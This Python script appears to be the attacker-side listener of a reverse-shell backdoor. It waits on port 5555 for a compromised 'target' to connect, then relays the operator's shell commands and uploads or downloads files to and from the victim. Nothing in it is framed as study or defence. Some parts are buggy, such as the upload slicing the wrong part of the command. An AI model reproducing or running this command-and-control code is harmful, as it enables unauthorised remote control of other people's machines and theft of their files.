import socket 
import json
import os

def target_communication():
    while True:
        command =  input("* Shell~%s: "%str(ip))
        reliable_send(command)
        if command=="quit":
            break
        #comparing three characters with empty space
        elif command =="clear":
            os.system("clear")
        elif command[:3] == "cd ":
           pass
        elif command =="clear":
            pass
        elif command[:6] == "upload":
            upload_file(command[:7])

        elif command[:8] == "download":
            
            download_file(command[9:])

        else:
            result = reliable_recv()
            print(result)

#upload a file to client
def upload_file(filename):
     f =  open(filename,"rb")
     target.send(f.read())

#download file from client
def download_file(filename):
    f =  open(filename,"wb")
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)


        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

 
def reliable_send(command):
    jsondata = json.dumps(command)
    target.send(jsondata.encode("utf-8"))
     
def reliable_recv():
    data =  ''
    while True:
        try:
            data =  data + target.recv(1024).decode("utf-8").rstrip()
            return json.loads(data)


        except ValueError:
            continue



HOST = "IP"
PORT =5555

server  = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((HOST,PORT))
print("[+] Listening for incoming connections")
server.listen()

target,ip= server.accept()
print(f"Target connect from {ip}")


target_communication()

